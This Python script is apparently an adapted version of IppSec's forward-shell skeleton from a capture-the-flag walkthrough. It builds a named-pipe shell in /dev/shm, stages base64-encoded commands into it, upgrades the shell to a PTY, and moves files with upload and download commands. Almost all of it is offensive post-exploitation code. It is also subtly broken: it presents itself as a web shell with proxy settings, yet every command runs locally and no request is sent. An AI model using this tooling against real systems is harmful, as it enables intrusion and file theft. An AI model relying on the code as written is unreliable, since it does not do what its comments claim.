#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
# Forward Shell Skeleton code that was used in IppSec's Stratosphere Video
# -- https://www.youtube.com/watch?v=uMwcJQcUnmY
# Authors: ippsec, 0xdf, lupman, phra


import base64
import random
import sys
import requests
import threading
import time
import readline
import tty
import termios
import subprocess


def exec_com(command, timeout = 50):
    if timeout == 0:
        return subprocess.Popen(command, shell=True)
    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read().decode().strip()

class WebShell(object):

    # Initialize Class + Setup Shell, also configure proxy for easy history/debuging with burp
    def __init__(self, interval=0.1, proxies='http://127.0.0.1:8080'):
        self.proxies = {'http' : proxies}
        session = random.randrange(10000,99999)
        print(f"[*] Session ID: {session}")
        self.pwd = f'/dev/shm'
        self.stdin = f'{self.pwd}/input.{session}'
        self.stdout = f'{self.pwd}/output.{session}'
        self.interval = interval

        # set up shell
        print("[*] Setting up fifo shell on target")
        MakePwd = f"mkdir -p {self.pwd}"
        MakeNamedPipes = f"mkfifo {self.stdin}; /bin/sh -c '(tail -f {self.stdin} | /bin/sh 2>&1) >> {self.stdout}' &"
        self.RunRawCmd(MakePwd, timeout=1)
        self.RunRawCmd(MakeNamedPipes, timeout=0)
        time.sleep(self.interval)

        # set up read thread
        print("[*] Setting up read thread")
        self.interval = interval
        thread = threading.Thread(target=self.ReadThread, args=())
        thread.daemon = True
        thread.start()

    # Read $session, output text to screen & wipe session
    def ReadThread(self):
        GetOutput = f"/bin/cat {self.stdout} | python -m base64"
        while True:
            result = self.RunRawCmd(GetOutput) #, proxy=None)
            if result:
                try:
                    result = base64.b64decode(result)
                    sys.stdout.buffer.write(result)
                    sys.stdout.buffer.flush()
                    ClearOutput = f': > {self.stdout}'
                    self.RunRawCmd(ClearOutput)
                except Exception:
                    pass
            time.sleep(self.interval)

    # Execute Command.
    def RunRawCmd(self, cmd, timeout=50, proxy=False):
        if proxy:
            proxies = self.proxies
        else:
            proxies = {}

        try:
            return exec_com(cmd, timeout)
        except:
            pass

    # Send b64'd command to RunRawCommand
    def WriteCmd(self, cmd):
        b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
        stage_cmd = f"echo {b64cmd} | python3 -m base64 -d >> {self.stdin} &"
        self.RunRawCmd(stage_cmd)
        time.sleep(self.interval * 1.5)

    def WriteSingleCmd(self, cmd):
        b64cmd = base64.b64encode(cmd).decode()
        stage_cmd = f"echo -n '{b64cmd}' | python3 -m base64 -d >> {self.stdin} &"
        self.RunRawCmd(stage_cmd)
        time.sleep(self.interval * 1.5)

    def UpgradeShell(self):
        # upgrade shell
        UpgradeShell = """python3 -c 'import pty; pty.spawn("bash")'"""
        self.WriteCmd(UpgradeShell)

    def UpgradeShellTTY(self):
        rows, cols = subprocess.check_output(['stty', 'size']).decode().split()
        UpgradeShell = f"reset; export SHELL=bash; export TERM=xterm-256color; stty rows {rows} cols {cols}"
        self.WriteCmd(UpgradeShell)

user = exec_com('whoami')
host = exec_com('hostname -s')
cds = ''
isTTY = False
prompt = ''
stdin = sys.stdin.fileno()
stdout = sys.stdout.fileno()
old_settings_stdin = termios.tcgetattr(stdin)
old_settings_stdout = termios.tcgetattr(stdout)

S = WebShell()
while True:
    if not isTTY:
        pwd = exec_com(cds + 'pwd')
        prompt = f'{user}@{host}:{pwd}$ '
    else:
        prompt = ''

    cmd = input(prompt)
    if cmd.startswith('cd'):
        cds += cmd + ';'

    if cmd == "upgrade":
        isTTY = True
        S.UpgradeShell()
        tty.setraw(stdin)
        tty.setraw(stdout)
        S.UpgradeShellTTY()
        while True:
            c = sys.stdin.buffer.raw.read(1)
            sys.stdin.flush()
            S.WriteSingleCmd(c)
            if int(c[0]) == 4:
                S.WriteCmd(f"rm -rf {S.pwd}; exit")
                termios.tcsetattr(stdin, termios.TCSADRAIN, old_settings_stdin)
                termios.tcsetattr(stdout, termios.TCSADRAIN, old_settings_stdout)
                sys.exit(0)
    elif cmd == "exit":
        S.WriteCmd(f"rm -rf {S.pwd}; exit")
        sys.exit(0)
    elif cmd.startswith(":upload "):
        splitted = cmd.split(" ")
        if len(splitted) < 2:
            print("[-] Usage: upload <src> [dst]")
        else:
            src = splitted[1]
            dst = splitted[2] if len(splitted)>2 else splitted[1].split('/')[-1]
            fd = open(src, 'rb')
            while True:
                data = fd.read(1024)
                if not data:
                    break
                datab64 = base64.b64encode(data).decode()
                S.WriteCmd(f"echo -n {datab64} | python -m base64 -d >> {dst}")
                print(f"[?] Uploading: {src} -> {dst}")
            print(f"[+] Uploaded: {src} -> {dst}")
    elif cmd.startswith(":download "):
        splitted = cmd.split(" ")
        if len(splitted) < 2:
            print("[-] Usage: download <src> [dst]")
        else:
            src = splitted[1]
            dst = splitted[2] if len(splitted)>2 else splitted[1].split('/')[-1]
            i = 0
            fd = open(dst, 'wb', buffering=0)
            while True:
                datab64 = exec_com(f"dd skip={i*1024} count=1024 if={src} bs=1 status=none | python -m base64")
                if not datab64:
                    break
                data = base64.b64decode(datab64)
                fd.write(data)
                i += 1
                print(f"[?] Downloading: {src} -> {dst}")
            print(f"[+] Downloaded: {src} -> {dst}")
    else:
        S.WriteCmd(cmd)
